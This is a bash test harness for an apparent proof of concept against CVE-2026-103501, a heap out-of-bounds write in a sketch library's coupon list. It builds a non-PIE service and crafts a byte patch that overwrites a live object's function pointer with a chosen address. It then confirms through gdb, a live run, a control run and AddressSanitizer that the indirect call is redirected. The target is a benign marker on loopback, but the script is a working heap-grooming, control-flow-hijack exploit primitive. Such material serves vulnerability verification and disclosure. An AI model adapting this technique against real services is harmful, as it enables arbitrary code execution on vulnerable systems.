#!/usr/bin/env bash
# Bounded, loopback-only tcache-groomed live-pointer probe for CVE-2026-103501.
# Answers: does the pinned OOB copy overwrite a live object's function pointer
# and does an indirect call through it reach a different benign marker?
# Existing harness scripts (build.sh, run_all.sh, run_hoosf.sh, run_victim.sh)
# are NOT modified. Every service binds 127.0.0.1; the driver dials only that.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
BIN="$OUT/groom_plain"
pass=0; fail=0
check() {
  if [ "$2" -eq 1 ]; then echo "PASS $1"; pass=$((pass + 1));
  else echo "FAIL $1"; fail=$((fail + 1)); fi
}
val() { grep -o "$1=[^ ]*" "$2" | head -1 | cut -d= -f2; }

bash "$HERE/build.sh" "$OUT" || exit 2
# -no-pie is a disclosed lab condition: it fixes marker addresses so the image
# can carry the exact pointer value. No malloc interposer, no library patch.
g++ -std=c++11 -O0 -g -no-pie -fno-omit-frame-pointer \
  -I"$OUT/v52/hll/include" -I"$OUT/v52/common/include" \
  "$HERE/groom_service.cpp" -o "$BIN" || exit 2

M3=$(nm -an "$BIN" | awk '$3=="benign_marker3"{print $1; exit}')
M2=$(nm -an "$BIN" | awk '$3=="benign_marker2"{print $1; exit}')
if [ -z "$M3" ] || [ -z "$M2" ]; then echo "FAIL marker symbols missing"; exit 2; fi
echo "MARKER2=$M2 MARKER3=$M3"
M3_SHORT=$(printf '0x%x' "$((16#$M3))")

# Coupon-relative byte patches. drive.py adds 8 for the wire header. Count 18
# gives a 72-byte copy: 32 in-vector plus 40 OOB bytes covering V's chunk
# header (+40), magic (+48), callback (+56) and refcount (+64), stopping
# before the sketch object above V at +96.
PATCH=$(python3 -c '
import sys
m3 = int(sys.argv[1], 16)
p = {}
def put(off, val, n=8):
    for i in range(n):
        p[off + i] = (val >> (8 * i)) & 0xff
put(40, 0x41)                   # V chunk size, preserved so V stays a live chunk
put(48, 0x1111111111111111)     # V.magic, chosen
put(56, m3)                     # V.callback, chosen = &benign_marker3
put(64, 0x3333333333333333)     # V.refcount, chosen
print(",".join("%d=%02x" % (k, p[k]) for k in sorted(p)))
' "$M3")
echo "PATCH=$PATCH"

# 1. gdb leg: measure the layout at the pinned copy site and the write effect.
python3 "$HERE/drive.py" --bin "$BIN" --port 38171 --count 18 --value 90 \
  --seed "$OUT/seed.bin" --gdb-script "$HERE/gdb_groom.gdb" \
  --patch "$PATCH" > "$OUT/groom_gdb.log" 2>&1
L="$OUT/groom_gdb.log"
ok=0
if grep -q 'GDB_COPY_SITE' "$L" && \
   [ "$(val GDB_DELTA_V "$L")" = "48" ] && \
   [ "$(val GDB_VCHUNK_BEFORE "$L")" = "0x41" ] && \
   [ "$(val GDB_VCHUNK_AFTER "$L")" = "0x41" ] && \
   [ "$(val GDB_VMAGIC_AFTER "$L")" = "1111111111111111" ] && \
   grep -q 'GDB_VCB_AFTER=0x' "$L"; then ok=1; fi
check "gdb: coupon p == G, live V at p+48, V chunk 0x41 preserved, chosen magic written" "$ok"
grep -E 'GDB_(COPY_SITE|P=|G=|V=|DELTA|VCHUNK|VMAGIC|VCB|VREF|DONE)' "$L"

# 2. hostile image, plain build: real indirect call through the overwritten pointer.
python3 "$HERE/drive.py" --bin "$BIN" --port 38172 --count 18 --value 90 \
  --seed "$OUT/seed.bin" --patch "$PATCH" > "$OUT/groom_hostile.log" 2>&1
L="$OUT/groom_hostile.log"
ok=0
if grep -q "AFTER_WRITE V_magic=1111111111111111 V_cb=$M3_SHORT V_ref=3333333333333333" "$L" && \
   grep -q 'BENIGN_MARKER3_EXECUTED' "$L" && \
   grep -q 'CALL_THROUGH ptr=' "$L" && \
   grep -q 'service_rc=0' "$L"; then ok=1; fi
check "hostile: chosen magic/ref, cb == marker3, indirect call executes marker3, rc 0" "$ok"
grep -E 'GROOM_PRE|AFTER_WRITE|BENIGN_MARKER|CALL_THROUGH|DRIVER' "$L"

# 3. benign control: same consumer, count 2, no patch. V untouched.
python3 "$HERE/drive.py" --bin "$BIN" --port 38173 --count 2 --value 90 \
  --seed "$OUT/seed.bin" > "$OUT/groom_benign.log" 2>&1
L="$OUT/groom_benign.log"
ok=0
if grep -q 'AFTER_WRITE V_magic=43414348454e5452' "$L" && \
   grep -q 'BENIGN_MARKER2_EXECUTED' "$L" && \
   ! grep -q 'BENIGN_MARKER3_EXECUTED' "$L" && \
   grep -q 'service_rc=0' "$L"; then ok=1; fi
check "benign count 2: live V unchanged, indirect call reaches original marker2, rc 0" "$ok"
grep -E 'GROOM_PRE|AFTER_WRITE|BENIGN_MARKER|CALL_THROUGH|DRIVER' "$L"

# 4. ASan attribution: the count-18 copy is a real OOB write at the pinned site.
python3 "$HERE/drive.py" --bin "$OUT/service_asan" --port 38174 --count 18 --value 90 \
  --seed "$OUT/seed.bin" > "$OUT/groom_asan.log" 2>&1
L="$OUT/groom_asan.log"
ok=0
if grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$L" && \
   grep -q 'WRITE of size 72' "$L" && \
   grep -q 'is located 0 bytes after 32-byte region' "$L" && \
   grep -q 'CouponList-internal.hpp:116' "$L" && \
   grep -q 'HllSketch-internal.hpp:63' "$L"; then ok=1; fi
check "ASan: WRITE of size 72 0B after 32B coupon vector at pinned :116 via public :63" "$ok"
grep -E 'ERROR: AddressSanitizer|WRITE of size|is located|CouponList-internal.hpp:116|HllSketch-internal.hpp:63' "$L" | head -8

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL_CHECKS_PASS"; exit 0; }
echo "SOME_CHECKS_FAILED"; exit 1
